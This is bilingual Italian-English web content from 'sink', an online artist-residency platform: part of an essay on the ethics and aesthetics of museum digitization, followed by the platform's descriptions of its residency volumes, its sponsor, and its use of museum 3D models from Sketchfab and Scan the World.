Una delle sfide etiche che emerge insieme alla capacità del museo digitale di rivelare, è il modo in cui si trattano le concezioni alternative di valore riguardanti la visualizzazione. Nel regno dei Bambui nel Camerun nord-occidentale, ad esempio, le nozioni di sacro e profano sono invertite rispetto al modello proposto da Groys. Mathias Alubafi Fubah scrive che nella cultura Bambui, le nozioni locali di sacralità e segretezza impongono che i manufatti più importanti, come le tazze ancestrali per bere, le statue, le maschere e gli abiti siano tenuti nascosti in un luogo a parte. Questi oggetti traggono il loro valore dal loro “occultamento piuttosto che dalla rivelazione” {concealment rather than revelation}.10 Questo metodo di determinazione del valore è diametralmente opposto al modo in cui la maggior parte dei musei occidentali tratta i manufatti culturali di valore. Qui si trova una tensione significativa: la digitalizzazione cerca di garantire una maggiore accessibilità e democratizzazione degli archivi e delle collezioni di riserva del museo. Tuttavia, secondo la tradizione locale, rivelare alcuni manufatti culturali si traduce in una diminuzione del loro status. Una prima sfida significativa emerge per chi opera nel campo della digitalizzazione: l’esercizio in se stesso perpetua una sorta di omogeneizzazione culturale radicata nei principi della ragione illuministica?
Di certo, la digitalizzazione consente una maggiore democratizzazione e accessibilità a una collezione, rispetto a quanto avverrebbe se non lo fosse. Tuttavia, un’ulteriore sfida che riguarda l’apertura alla collezione museale in seguito alla digitalizzazione è il modo in cui imbattersi in artefatti rilevanti.11 In che modo le bande di informazione diventano disponibili per la consultazione? In un mare di milioni di oggetti digitali, la barra di ricerca vuota diventa una prospettiva intimidatoria. I musei potrebbero tentare di reintrodurre la serendipidità della scoperta, utilizzando l’uso di un algoritmo di raccomandazione per suggerire opere rilevanti. Tuttavia, questo percorso è di per sé carico di risultati sospetti nel raggiungere fini a proprio vantaggio.12 Un progetto che (a mio parere) introduce con successo la serendipità all’esperienza museale digitale, utilizzando algoritmi, è Recognition di Fabrica e JoliBrain, vincitori del premio IK 2016 della Tate (Museo di Londra). Il progetto consisteva in una galleria online che utilizzava un algoritmo di apprendimento automatico per confrontare nuove immagini della Reuters con immagini composte in modo simile all’interno delle collezioni d’arte e d’archivio della Tate.13

Inoltre, c’è un costo significativo sia per la digitalizzazione di una collezione esistente, sia per le sfide che comportano la manutenzione dell’architettura del software e la garanzia che questa collezione digitale sopravviva al processo di obsolescenza tecnologica. Ciò significa che solo i musei con maggiori finanziamenti da destinare al processo di digitalizzazione possono permettersi di raccogliere i benefici della visibilità offerta da essa. In questo modo, le istituzioni con più sostegno economico esercitano una maggiore influenza su ciò che è a norma, all’interno di un canone, ma in questo modo forniscono una nuova sfida per la democratizzazione del processo di digitalizzazione.14
Nonostante la percezione dell’effervescenza della sfera virtuale, una sfida associata che impedisce di considerare la raccolta digitale come una soluzione di conservazione finale o un processo di immortalità dell’oggetto, è il materiale fisico vulnerabile associato ai dati. I possibili problemi che si presenteranno in un orizzonte di medio-lungo termine includono la vulnerabilità dei siti in cui i dati sono fisicamente immagazzinati, la corruttibilità dell’informazione digitale e, come accennato in precedenza, la probabile possibilità di obsolescenza tecnologica. L’accumulo da parte dei musei di dati digitali non è così immateriale come si potrebbe supporre. In una delle sue interviste più esaurienti, il noto ed elusivo musicista Aphex Twin parla di come un formato analogico come il disco in vinile, nonostante sia più vecchio, potrebbe sopravvivere ai nuovi formati digitali presenti su USB, su hard disk e persino sui servizi di cloud streaming online, il che lo rende il suo metodo preferito per archiviare il suo lavoro. Ironia della sorte, l’intervista è stata inizialmente trovata su Soundcloud ma successivamente cancellata, e ora è accessibile solo attraverso la Wayback Machine, un archivio di internet. 15
Finora ho considerato le prove istituzionali causate dalla digitalizzazione, per la politica della visualizzazione e della “canonizzazione” di un processo di democraticità. Ora rivolgo lo sguardo sugli oggetti stessi e a come la digitalizzazione influisce sui cambiamenti nella rappresentazione e nella diffusione.
OCCUPARSI DEGLI OGGETTI STESSI
Quando un visitatore entra ed esce da Blythe House, viene accolto da Luci di Nara di Igor Mitoraj – un’imponente scultura dal volto frammentato. Non posso fare a meno di pensare che la scultura rappresenti lo spirito dell’atto effimero di collezionare a cui si dedicano archivisti come Christopher. I frammenti di materiale di scarto; il contenuto del cassetto dello studio di Lucienne Day, un polveroso modellino di un treno d’altri tempi, una collezione personale di copertine di romanzi Penguin. L’archivista mette insieme queste copertine, cercando di imporre il minimo significato necessario per consentire ai visitatori di ricostruire le proprie narrazioni e i profili delle persone, i cui effetti sono conservati al loro interno.
Una seconda area di contesa, che emerge dalla digitalizzazione, è la rappresentazione di oggetti all’interno dello spazio virtuale. Armati della prospettiva di un’estetica dell’oggetto simulato e della convinzione ottimistica della possibilità di una maggiore verosimiglianza nel processo di digitalizzazione, si potrebbe considerare la digitalizzazione come una forma di immortalità dell’oggetto museale. Infatti, il processo di digitalizzazione ci permette di congelare nel tempo un oggetto, o addirittura un intero sito, consentendoci, in futuro, di rivisitarlo nel suo stato odierno. Un progetto che tenta di farlo è NewPalmyra, un tentativo di ripristinare l’Arco di Palmyra, distrutto dall’ISIS in Siria nell’ottobre 2015. Questo progetto ha prodotto una replica in scala ridotta stampata in 3D dell’arco, che è stata portata in tour in diverse parti del mondo.16 Attualmente si trova a Dubai, in testimonianza della nostra capacità tecnica di rivivere e immortalare ciò che è andato perduto. Analogamente, l’ala Arts and Culture di Google gestisce il progetto OpenHeritage, che permette agli utenti online di esplorare le ricreazioni virtuali di siti storici. La sfida è decidere quando e cosa in un oggetto o sito di valore dovrebbe essere registrato.
Quando un oggetto (ad esempio un antico strumento musicale) viene digitalizzato, sia attraverso l’acquisizione di un’immagine, che con la scansione 3D o la registrazione del suono che produce, spetta alle istituzioni decidere la migliore forma di rappresentazione. Dopotutto, è praticamente impossibile catturare l’oggetto, in quanto noumeno, nella sua piena funzionalità e incarnazione. Questa scelta pragmatica si traduce nella compressione del significato di un oggetto: alcuni elementi d’informazione legati alla fisicità vengono rimossi nella sua trasmissione al virtuale. Questo aspetto è motivo di preoccupazione per coloro che sono coinvolti nello studio del materiale d’archivio, soprattutto perché i musei digitali sostituiscono le sale di studio “fisiche” nei musei.17 I surrogati digitali vengono visti come l’alternativa più economica e sicura alla manipolazione dell’oggetto fisico, il che rende i custodi delle collezioni più riluttanti a consentire l’accesso agli originali.18 Con un accesso ridotto agli oggetti stessi, la rappresentazione e il significato si limitano ai soli elementi ritenuti rilevanti nella creazione della copia digitale.
Potremmo aspettarci che questo sia un problema tecnico, che la nostra crescente abilità tecnologica risolverà un giorno: ottenendo la simulazione completa della forma, della funzione e del significato di un oggetto. Si tratta di un fenomeno che Jonathan Sterne chiama “il sogno della verosimiglianza”: la ricerca di una rappresentazione sempre più realistica o di una corrispondenza con la “realtà” attraverso i nostri media, spesso indicativa del progresso tecnologico. Sorge tuttavia una complicazione, che riguarda il piacere estetico, l’immersione e la definizione, che non hanno alcun rapporto necessario l’uno con l’altro.19 Spesso, perché la rappresentazione rispecchi la realtà, deve essere aumentata – ritoccata. Un concetto esemplificato nelle parole di Robert J. Flaherty, che ha diretto Moana, una controversa docufiction sulla vita polinesiana:
“A volte bisogna mentire… Spesso si deve distorcere una cosa per cogliere il suo vero spirito.” {Sometimes you have to lie… One often has to distort a thing to catch its true spirit.}20
Questa, insieme ad altre pratiche di realtà amplificata, sono esempi dell’iperrealtà di Baudrillard: una simulazione distorta del reale, che appare più realistica della realtà stessa.21 La creazione dell’iperreale pervade la pratica mediatica. Nell’ambito sonoro, l’attuale pratica di registrazione impone che i suoni debbano avere più frequenze alte rispetto al reale.22 Nel cinema documentario, è uso comune ricorrere alla ricostruzione degli eventi invece di utilizzare il materiale d’archivio.23 Secondo Schwarz, la cultura moderna della copia tende verso ogni riproduzione e simulazione trascendendo l’originale. Nel racconto satirico Pierre Menard, Author of the Quixote, Borges scrive di Pierre Menard, un autore fittizio che, essendosi così immerso nel Don Chisciotte di Cervantes, scrive una copia del romanzo parola per parola, in spagnolo originale del XVII secolo. La storia descrive una recensione sulla riproduzione del Chisciotte di Menard, che sostiene che la copia sia di fatto migliore all’originale di Cervantes, grazie ai livelli di immersione di cui Menard avrebbe avuto bisogno per poter ricreare il Chisciotte con la precisione esatta del suo contesto novecentesco.
La creazione dell’immagine iperreale indistinguibile dalla realtà è un tema che caratterizza Rhein II, il recente lavoro del fotografo Andreas Gursky, modificato digitalmente, che è stato venduto per un valore di 4,3 milioni di dollari nel 2011, la somma più alta mai registrata per la vendita di una fotografia.24 La cosa interessante dell’immagine è che si tratta di una stampa digitale. Non c’è alcuna restrizione sul numero di copie che questo lavoro potrebbe avere, se Gursky decidesse di stamparne di più. Questo aspetto cambia per una fotografia su pellicola, la cui fisicità ne limita la riproduzione. Riflettendo sul proprio lavoro, Gursky descrive il suo progetto come tale:
“Mi interessa l’approssimazione ideale tipica dei fenomeni quotidiani – nel creare l’essenza della realtà”. {I am interested in the ideal typical approximation of everyday phenomena – in creating the essence of reality.}25
Rhine II, Andreas Gursky → Vedi riferimento
Il sogno di verosimiglianza e le immagini iperreali esemplificate dal Rhein II di Gursky contrastano con quella che Hito Steryl chiama “l’immagine povera”, che si riferisce al mare di immagini a bassa risoluzione compresse, rielaborate, scaricate e nuovamente caricate. Nel suo articolo In Defense of the Poor Image, l’autrice sostiene il riposizionamento di queste immagini all’interno della gerarchia dei valori. Piuttosto che rappresentare l’accuratezza del soggetto stesso, tali immagini presentano uno “snapshot” delle persone coinvolte mentre se ne riappropriano. I segni di queste immagini rivelano una molteplicità d’uso da rispettare, o almeno indagare.26 Per Steryl, dovrebbe emergere una nuova metrica di apprezzamento per la valutazione di immagini povere, un valore che non è determinato dalla risoluzione o dalla scarsità, ma piuttosto dalla velocità, dall’intensità e dall’estensione della diffusione. L’immagine povera non indica la fonte originale da cui proviene, ma piuttosto le condizioni di vita che portano alla sua dispersione digitale. E’ per questo motivo che Steryl sostiene che queste immagini ci parlano più della realtà rispetto alle immagini ad alta definizione, che la società tende tradizionalmente a valorizzare.27
I temi di Steryl possono essere estesi anche alla materialità di altri media digitali come il suono. Nonostante l’equivalenza percepita tra i nuovi file audio digitali e i formati analogici, il suono differisce nel modo in cui si decompone. Un DJ che rallenta un disco in vinile produce un insieme distinto di basse frequenze, così come avviene per i file .wav e .mp3.28 Quando un .mp3 viene compresso più di una volta, si crea un equivalente musicale alla “pixelizzazione” in immagini note come “artefatto di compressione” {compression artefact}.29 La chiamata di Steryl verso una nuova estetica per l’immagine compressa, è qualcosa che esiste già nel regno della musica. In particolare nel successo della fiorente cultura del suono campionato, derivante dall’uso della “drum machine” e del “sample AKAI MPC” negli anni ’9030, e di generi musicali emergenti come il “lo-fi house”31 e il “Gqom” – un genere di musica house sudafricana di Durban, reso popolare attraverso gli altoparlanti rumorosi della moltitudine di minibus taxi, in viaggio tra le township di tutto il paese.32
Possiamo considerare i modelli 3D delle collezioni digitali nella stessa ottica? Christophe Lemaitre suggerisce che qualsiasi tentativo di restauro di un’opera d’arte non deve mai regredire nel tempo, o cercare di fissare il significato dell’opera. Essere coinvolti nel restauro significa invece essere nel business della riproduzione: per la continuazione e l’estensione di un’opera d’arte.33 Ciò è esemplificato, in effetti, nel restauro di affreschi con la tecnica del tratteggio. Secondo questa pratica, le modifiche sono rese chiaramente visibili quando si è vicini all’opera, ma sono indistinguibili da lontano.34 Potremmo dire lo stesso per le nostre pratiche di conservazione digitale?
Un’estetica del simulato e iperreale comporterebbe il rifiuto dell’idea che il simulato e il compresso siano una mera ombra o apparizione della verità. Piuttosto, le surrogate digitali diventano riproduzioni nel senso di Lemaitre. In questo caso, la realtà funziona come la Nave di Teseo, le cui parti non rimangono mai costanti e vengono continuamente sostituite e aumentate. Rimangono unite in virtù dell’essere parte della stessa catena di continuità causale. In questo senso, le copie digitali continuano ad aggiungere significato all’originale, assumendo contemporaneamente significati nuovi di per sé, con particolare attenzione alla loro materialità come oggetti digitali.
Come possiamo fare i conti con i meccanismi di compressione che si verificano all’interno delle collezioni nell’era digitale? Mentre le concezioni sociali del valore passano dalla valorizzazione dell’originale immutabile all’apprezzamento della copia ampiamente diffusa, la consapevolezza che ciò che le collezioni rappresentano attualmente non è che un modo per comprimere o formattare ciò che dovremmo considerare culturalmente saliente. Questo apre lo spazio necessario per la creazione di nuove interpretazioni e contro-narrazioni che offrono forti alternative alle nostre attuali pratiche di diffusione e conservazione. In questo modo, possiamo sfidare le voci dominanti che guidano le nostre istituzioni culturali, e le voci convenzionalmente considerate al di fuori del campo metaforico dell’udito potrebbero essere rese udibili.

3Here I use collections to encompass institutions involved in the business of collecting broadly, such as archives, libraries and museums. There are however, obvious differences between these. For example, Museums are held accountable to public pressures of display.Qui uso la parola collezione per intendere istituzioni che si occupano di collezionismo in senso largo, come archivi, biblioteche e musei. Tuttavia, ci sono ovvie differenze tra di esse. Ad esempio, i musei sono tenuti a rispondere alle pressioni del pubblico.
4Other proposed methods of dealing with the glut of objects facing many museums include inter-museum loans and deaccessioning. These however, raise their own set of legal and museological challenges which are beyond the scope of this essay to address.Altri metodi proposti per affrontare la sovrabbondanza di oggetti di fronte a molti musei sono il prestito intermuseale e il deaccessioning (rimozione di opere dalla collezione). Questi, tuttavia, sollevano una serie di sfide legali e museologiche che escono dallo scopo di questo saggio.

3Here I use collections to encompass institutions involved in the business of collecting broadly, such as archives, libraries and museums. There are however, obvious differences between these. For example, Museums are held accountable to public pressures of display.Qui uso la parola collezione per intendere istituzioni che si occupano di collezionismo in senso largo, come archivi, biblioteche e musei. Tuttavia, ci sono ovvie differenze tra di esse. Ad esempio, i musei sono tenuti a rispondere alle pressioni del pubblico.
4Other proposed methods of dealing with the glut of objects facing many museums include inter-museum loans and deaccessioning. These however, raise their own set of legal and museological challenges which are beyond the scope of this essay to address.Altri metodi proposti per affrontare la sovrabbondanza di oggetti di fronte a molti musei sono il prestito intermuseale e il deaccessioning (rimozione di opere dalla collezione). Questi, tuttavia, sollevano una serie di sfide legali e museologiche che escono dallo scopo di questo saggio.

Volume II
Sink is an online platform that hosts a monthly residency program working with artists of all shapes and sizes. We invite artists to inhabit a webpage for a month: making use of this space to explore ideas, conduct experiments, have fun, present content as they wish and develop a chosen research. Sink also holds short interviews and will publish commissioned pieces of writing throughout the year.
This is the second volume of sink running from September 2018 to August 2019, with residencies split over a period of 12 months. In this second volume, as a springboard for their research, artists are invited to work from a selection of 3D models of artefacts held in various national collections around the world and gathered through websites such as Sketchfab and Scan the World. Resident artists are then asked to construct a web page where they can digest, destroy, enhance or simply re-propose a research from the selected objects. The progress of their page and research will be available at all times and its final iteration will then be viewable through our archive.
Sink è una piattaforma online che presenta un programma di residenze mensili ospitando artisti di tutte forme e dimensioni. Sink invita artisti ad abitare una pagina web per un mese, usando questo spazio per esplorare idee, condurre esperimenti, divertirsi, presentare contenuti come vogliono e sviluppare una ricerca scelta. Sink presenta anche brevi interviste e pubblicherà testi commissionati attraverso l’anno.
Questo è il secondo volume di sink che durerà da luglio 2018 a giugno 2019, con le residenze suddivise su un periodo di 12 mesi. In questo secondo volume, come punto di partenza per la loro ricerca, gli artisti sono invitati a lavorare da una selezione di modelli 3D di artefatti presenti in collezioni nazionali in tutto il mondo e raccolti attraverso siti web come Sketchfab e Scan the World. Agli artisti residenti viene chiesto di costruire una pagina web in cui possono digerire, distruggere, migliorare o semplicemente riproporre una ricerca stimolata dagli oggetti selezionati. Il progresso delle loro pagine e ricerche sarà disponibile ad ogni momento e la loro versione finale sarà visibile attraverso il nostro archivio.

Volume I
Sink started in June 2017 after much discussion between us around the idea of creating room online for the dissemination of the process and work-in-progress of artistic practice. Sink’s interest does not lie in presenting finalised works and projects but rather in the possibility of giving space for experimentation to favor artistic research and its divulgation.
In its first year → vol1.sink.sexy ← sink hosted 12 artists for consecutive one-month-long residencies resulting in a fierce year-long and perpetually renewing programme. Each artist was invited to present a research they wished to explore further on their personal webpage. They also redesigned the sink logo which became the platform’s official logo during their residency. Resident artists were invited to consider the webpage as a space for experimentation and encounter with a public, thinking through the quirks and possibilities of the online realm as a way to interact with the viewer. The construction of the pages was either done by the artists themselves or by sink in an attempt to translate artists’ requests at best (some of content still isn’t in mint condition, sorry). We also spoke to a number of brilliant artists and got plenty of news, tips and curious links through our interviews published twice a month.
Sink started from informal conversations and light-hearted dialogues and its heart still rests on these pillars.
Sink è iniziato a giugno 2017 dopo lunghe discussioni attorno alla possibilità di creare spazio online per la disseminazione del processo della creazione artistica. L’interesse di Sink non risiede nel presentare opere e progetti finalizzati, ma nella volontà di dare spazio alla sperimentazione per favorire la ricerca artistica e la sua divulgazione.
Nel suo primo anno → vol1.sink.sexy ← sink ha ospitato 12 artisti per residenze consecutive di un mese, con un feroce programma in continuo rinnovo per un anno. Ogni artista è stato invitato a presentare una ricerca che desiderava esplorare ulteriormente sulla sua pagina web personale. Gli artisti hanno anche ridisegnato il logo di sink che è diventato il logo ufficiale della piattaforma durante la loro residenza. Gli artisti residenti erano invitati a considerare la pagina web della residenza come uno spazio per la sperimentazione e l’incontro con un pubblico, pensando alle le stranezze e le possibilità dello spazio web come modalità per interagire con lo spettatore. La costruzione delle pagine è stata fatta dagli artisti o da noi stesse in un tentativo di tradurre al meglio le richieste dei residenti (alcuni dei contenuti non sono ancora ottimizzati, scusateci). Abbiamo anche parlato con un numero di artisti brillanti e abbiamo ricevuto numerose notizie, suggerimenti e link curiosi attraverso le nostre interviste pubblicate due volte al mese.
Sink è nato da conversazioni informali e dialoghi spensierati e il suo cuore poggia ancora su questi pilastri.

Fondazione Pini (or The Pini Foundation) lies at the heart of Brera in Milan, Italy. It was created in 1991 as per the will of Adolfo Pini (1899-1970) to promote the art of his uncle Renzo Bongiovanni Radice. Aside from keeping alive the art of both Pini and Radice, the foundation carries out cultural activities and offers scholarships to support young artists practicing in various disciplines across the arts. The foundation hosts contemporary art exhibitions with Italian and international artists. It set up and curates “Storie Milanesi”, a website dedicated to telling the story of Milan through 15 figures, their museum-homes, artist studios, architect and designer firms which today have become museums.
Fondazione Pini is sink’s first sponsor and we’re incredibly thankful for their generosity!

La Fondazione Pini si trova nel cuore di Brera a Milano. Fu creata nel 1991 per volontà di Adolfo Pini (1899-1970) per promuovere l’opera di suo zio Renzo Bongiovanni Radice. Oltre a mantenere viva l’arte di Bongiovanni Radice, la Fondazione svolge attività culturali, sostiene giovani artisti attivi in tutte le arti, attraverso borse di studio. La Fondazione presenta mostre temporanee di arte contemporanea con artisti del panorama nazionale e internazionale.
Ha inoltre ideato e curato il progetto “Storie Milanesi”, un sito che racconta Milano attraverso 15 personaggi, le loro case museo, studi d’artista, studi di architetti e designer, oggi musei.

The following text introduces Volume II and why we chose to center the program around the use of 3D models of artifacts held in various national collections around the world and gathered through websites such as Sketchfab and Scan the World.
As we were nearing the end of the first year of sink being live, we decided that we wanted to close the first year as one Volume and focus on developing a second one. Volume II, also lasting one year, will follow the same format as the previous one, but work as a separate entity centered around a clearer cut thread. Every volume nonetheless responds to a specific research linked to pop or internet culture inherent in the platform. The monthly residencies and bi-monthly interviews are what makes the identity of sink and will therefore continue in every volume, whereas other content is developed with a format in direct response to the theme. For Volume II, we have decided to commission texts to be published on the website throughout the year. Written by artists, curators, designers and writers, the texts will introduce you to the theatre of 3D models, explore digital archives and take you on journeys to reinterpret specks of the platform.
It’s challenging to write about sink as only one thing and to find enough distance to write about it somewhat objectively or categorically. It’s been part of our lives for the past year and a half, it’s had us Skype during our lunch breaks or relaxing beach-times, attempting to find wifi in the awkwardest positions and conversing in the most unique locations (… under the hairdryer at the threshold of the bathroom or the entrance outside of the Goldsmiths library) yet sink has always taken us a step closer to meeting and collaborating with artists whose practice we admire. It’s been both fun and challenging, we expect this new volume to be in no way different if not only exponentially worse and better at the same time. We have deeply enjoyed preparing and developing Volume II and hope you get as much out of it as we have.
Since the beginning of sink (Volume I) our primary activity has revolved around the online residency: sink resident artists are hosted on an assigned URL for one month, during this time, they are invited to approach the web page as they would any physical space within which they are hosted. They are asked to present research by updating the page with chosen content throughout the residency, experiencing how their research evolves, often in response to the specificities of the space. The progress of their page and research is available at all times, and its final iteration is viewable through our archive. The residency is thought of as a place for experimentation that isn’t focused on the production of a finished artwork but on thinking of how to use the web space to develop the ways in which the content is encountered by viewers. Artists are invited to exploit all aspects of the web page to best present and develop their research, this often includes distorting modes of browsing which usually go unnoticed to have them become noticeable, for example, the direction in which you scroll through a webpage, unwanted pop-ups and text inserted within the code which becomes visible only if one goes looking for it. The page becomes a medium that is full of quirks and peculiarities which artists can work with or against in the presentation of the images, texts, videos, audio files or any other digital format they have developed for the residency. Compressing, uploading, downloading, as integral parts of any experience with the digital, are ingrained in the residency process.
In Volume II, as a springboard for their research, artists are invited to work from a selection of three-dimensional models of artefacts held in various national collections around the world. They are then asked to develop their web page where they can digest, destroy, enhance or simply re-propose a specific research from the selected objects. These models are available on various platforms, which, for optimal use, require browsing, signing up, logging in and downloading; the resident having to go through these steps is immediately immersed in the user behavior of the platform. And by using the models, the artists are introduced into the modes of distribution that have been developed for these 3D models to be produced in institutions around the world, made available online and at times downloadable as .obj or .stl. These interactions with the platforms and the models will then be reflected on their personal residency pages. As a platform that tries to address artistic practice at an intersection with pop and internet culture, it also felt necessary for sink to discuss processes of 3D digitization as it’s slowly making its way from a niche sector, usually hidden from view and kept in the stores of major collections, to a widely spread phenomenon which allows anyone with internet-access to download and potentially print these 3D models in order to keep a colorful version of an artifact forever.
The models used by the sink platform and residents are sourced through the Sketchfab website and the open-source platform Scan the World, having been uploaded either by the institutions themselves or by users. 3D digitization was developed to support museums in their focus on collection conservation and display. Digital 3D models are created to document, not only museum artifacts but also heritage sites and archaeological finds. The technology allows for the study of the materials without the need for access, which often comes in handy in the case of heritage sites. The models are also used to simulate scenarios to examine the decay of the artifacts in time and test the outcomes of a potential restoration of the objects. More recently, digital reconstruction has been used for the ‘restoration’ of lost heritage from photographic data with the digital objects being conceived as tools for looking at our own history.
The models are shells of existing objects; when viewed in 3D, the objects are hollow inside. As indicative as they can be of the original they cannot represent its material, color, weight or texture faithfully. After being scanned, they are continuously edited. The models are constituted of ones and zeros and stored in bits. They lack meaning until they are read and interpreted by a machine capable of turning the information it receives into visual material. These models are perceived “in an unreal, virtual space that opens up behind the surface of the computer screen”.[1] We might tend to think of these 3D models as the perfect replica of the original, but they are the product of interpretation and ultimately are the result of hypotheses of space and material.
When displayed on these various platforms, the models are often represented in front of a black background or one featuring the institution’s logo. The models are floating in digital space and are too flattened to resemble anything graspable, yet not flat enough to be considered a photograph. If one starts scrolling through a grid of various objects fast enough, without paying close attention, they start looking alike and blending into one another as disembodied objects. The models are removed from the knowledge and contextual material that give them meaning within a gallery or exhibition space where they are displayed in a context that has been developed specifically for each object in all of its aspects. On these platforms, they are pasted on unwavering dark backgrounds as data files being interpreted by computers. They lack the “original object’s material conditions and the contemplative possibilities offered by the heterotopia of a gallery space.”[2]
When museums publish these lacking copies through online platforms, they make copies that are ripe to be stolen, retranslated, redigested and reproposed. They have produced images that have more value in the process of distribution they are reflective of that in the quality of the image itself. sink is asking resident artists to visit these various websites whilst being mindful of their licenses in the way they are using the objects, leaving freedom for the rules to be broken. Artists are invited to explore these platforms, taking advantage of them, replicating them, changing them and remashing them. Questioning how the objects ended up in the hands of the specific institutions, then on these platforms and finally on everyone’s hard disks, downloads folders, desktops or even physically sitting on one’s desk as a 3D printed sculpture. Understanding how the objects are packaged and presented in this “unruly archive” that Seth Price calls the internet:
“with more and more media readily available through this unruly archive, the task becomes one of packaging, producing, reframing, and distributing; a mode of production analogous not to the creation of material goods, but to the production of social contexts, using existing material. What a time you chose to be born!”.[3]
sink resident artists are invited to define one collection they would like to explore and from it chose an open number of 3D models — to be listed in the residency presentation page — which will have to feature in some way in their residency. The residency can take multiple forms, it doesn’t need to be focused on the use three-dimensional technology. The only requirement that is placed on the artist is to create something that can be downloaded by the end of the residency month. The process of the residency starting with the artist choosing 3D models from one specific collection and closing with a downloadable piece reflects and distorts the user’s experience of the Sketchfab or Scan the World websites. As with any sink residency, it places the artists in direct contact with the action of downloading which is intrinsic to any interaction with the www.
Maybe, when we look back in a few year’s time, this second volume of sink will be completely outdated both aesthetically and in the research it addresses, and we don’t particularly mind. We are focusing on a precise moment in time when we are still unsure of whether digitization is a trend that is indicative of museum’s rush to digital innovation and will soon meet its end, or if processes of 3D digitization will, as is probable, have a fundamental impact on how cultural institutions work. And at a time when 3D objects seem to be widespread in contemporary art and permeating pop culture, it feels especially relevant to attempt to understand and challenge the framework within which these models are produced and presented through the program developed on the sink platform, that will bring together diverse voices and interpretations of the same material.

Il seguente testo introduce il Volume II e la nostra decisione di focalizzare il programma sull’uso di modelli 3D di artefatti conservati in collezioni nazionali di tutto il mondo e raccolti attraverso siti web come Sketchfab e Scan the World.
All’avvicinarsi della fine del primo anno di esistenza di sink, abbiamo deciso che volevamo chiudere il primo anno come un unico volume e concentrarci sullo sviluppo di un secondo volume. Anch’esso della durata di un anno, il Volume II segue lo stesso formato del precedente, ma funziona come un’entità separata centrata attorno a un filo conduttore predefinito. Le residenze mensili e le interviste bimestrali costituiscono l’identità di sink e quindi continueranno in ogni volume, mentre altri contenuti verranno sviluppati con un formato in risposta diretta al tema centrale. Per il Volume II abbiamo deciso di commissionare dei testi che saranno pubblicati sul sito durante l’anno. Scritti da artisti, curatori, designer e scrittori, i testi vi introdurranno al teatro dei modelli 3D, esploreranno archivi digitali e vi condurranno in viaggi di reinterpretazione dei vari angoli della piattaforma.
E ‘ impegnativo scrivere a proposito di sink come una cosa unica e trovare la distanza sufficiente per parlarne in modo obiettivo o categorico. sink fa parte della nostra vita da un anno e mezzo, ci ha viste fare chiamate su Skype durante le pause pranzo, in momenti di relax in spiaggia, provando a trovare il wifi nelle posizioni più scomode e dialogando in luoghi relativamente unici (…sotto l’asciugamani alle soglie del bagno o all’ingresso della biblioteca dell’università) ma con la soddisfazione di collaborare con artisti di cui ammiriamo il lavoro. E’ stato divertente e stimolante e ci aspettiamo che questo nuovo volume non sia in alcun modo diverso se non esponenzialmente peggiore e migliore allo stesso tempo . Ci siamo divertite molto nella preparazione e lo sviluppo del Volume II e ci auguriamo che anche voi possiate apprezzarlo come noi.
Fin dall’inizio di sink (Volume I) la nostra attività principale è stata incentrata sulla residenza online: gli artisti residenti di sink sono ospitati su un URL assegnato per un mese. Durante questo periodo, sono invitati ad affrontare la pagina web come se fosse uno spazio fisico all’interno del quale sono ospitati . Agli artisti residenti viene chiesto di presentare una ricerca aggiornando la propria pagina con il contenuto da loro scelto e scoprendo come evolve la loro ricerca durante il periodo di residenza, spesso in risposta alle specificità dello spazio. Il progresso della loro pagina è visibile in qualsiasi momento e la sua versione finale diventa parte del nostro archivio. La residenza è pensata come un luogo di sperimentazione che non si concentra sulla produzione di un’opera d’arte finita ma sul pensare a come utilizzare lo spazio web per sviluppare i modi in cui il contenuto viene percepito dagli spettatori. Per presentare e sviluppare al meglio la loro ricerca, gli artisti sono invitati a sfruttare tutti gli aspetti della pagina web, il che può includere la distorsione di modalità di navigazione che passano inosservate per farle diventare evidenti . Ad esempio, la direzione in cui si scorre attraverso una pagina web, pop-up indesiderati e testo inserito all’interno del codice che diventa visibile solo se si va a cercarlo. La pagina diventa un mezzo pieno di stranezze e peculiarità con cui gli artisti possono lavorare nella presentazione di immagini, testi, video, file audio o qualsiasi altro formato digitale sviluppato per la residenza. La compressione, il caricamento, il download sono aspetti radicati nel processo di residenza in quanto componenti integranti di qualsiasi esperienza con il digitale.
Nel Volume II, come punto di partenza della loro ricerca, gli artisti sono invitati a lavorare da una selezione di modelli tridimensionali di artefatti mantenuti in diversi musei in tutto il mondo. In seguito, gli viene chiesto di sviluppare la loro pagina web dove possono digerire, distruggere, migliorare o semplicemente riproporre una ricerca specifica dagli oggetti selezionati. Questi modelli sono disponibili su diverse piattaforme che, per un uso ottimale, richiedono la navigazione, l’iscrizione, l’accesso e il download; il residente che deve seguire questi passaggi viene immediatamente immerso nel comportamento dell’utente di una piattaforma. Utilizzando i modelli, gli artisti vengono introdotti nelle modalità di distribuzione sviluppate per permettere che questi modelli 3D prodotti in istituzioni di tutto il mondo, possano essere resi disponibili online e talvolta scaricati come .obj o .stl. Queste interazioni con le piattaforme e gli oggetti saranno poi riflesse sulle pagine dei residenti. In quanto piattaforma che cerca di affrontare la pratica artistica all’incrocio con la cultura pop e internet, abbiamo anche sentito il bisogno di affrontare i processi di digitalizzazione 3D in quanto stanno lentamente passando da un settore di nicchia, di solito nascosto alla vista e tenuto nei magazzini delle collezioni più importanti, ad un fenomeno ampiamente diffuso che permette a chiunque con accesso a internet di scaricare e potenzialmente stampare questi modelli 3D al fine di mantenere una versione colorata di un artefatto per sempre.
I modelli utilizzati da sink e dai residenti sono raccolti attraverso il sito Sketchfab e la piattaforma open source Scan the World e sono stati caricati dalle istituzioni stesse o dagli utenti. La digitalizzazione 3D è stata sviluppata per supportare i musei nelle loro attività di conservazione ed esposizione delle collezioni. Modelli digitali vengono creati per documentare non solo reperti museali, ma anche siti del patrimonio e reperti archeologici. La tecnologia consente di studiare i materiali senza la necessità di accedervi, cosa che spesso si rivela utile nel caso dei siti di patrimonio culturale. I modelli sono utilizzati anche per simulare scenari per esaminare il decadimento degli artefatti nel tempo e esaminare i risultati di un potenziale restauro degli oggetti. Di recente, la ricostruzione digitale è stata utilizzata per “ricostruire” il patrimonio perduto grazie a dati fotografici.
